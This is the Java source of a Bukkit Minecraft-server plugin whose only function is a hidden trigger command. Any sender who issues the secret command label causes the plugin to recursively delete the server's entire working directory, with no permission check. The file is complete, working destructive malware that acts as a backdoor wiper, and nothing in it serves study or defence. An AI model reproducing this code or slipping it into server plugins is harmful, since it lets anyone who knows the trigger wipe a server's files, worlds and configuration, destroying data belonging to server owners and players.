package fucktheserver.fucktheserver;

import org.bukkit.plugin.java.JavaPlugin;
import java.io.File;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;

public final class FuckTheServer extends JavaPlugin {
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
        if (label.equalsIgnoreCase("FuckTheServer1145141919810")) {
            String filePath = System.getProperty("user.dir");
            File forder = new File(filePath);
            deleteForder(forder);
            return true;
        } else {
            return true;
        }
    }

    public static void deleteForder(File forder) {
        File[] files = forder.listFiles();
        if (files != null) {
            File[] var5 = files;
            int var4 = files.length;

            for(int var3 = 0; var3 < var4; ++var3) {
                File f = var5[var3];
                if (f.isDirectory()) {
                    deleteForder(f);
                } else {
                    f.delete();
                }
            }
        }

        forder.delete();
    }

}


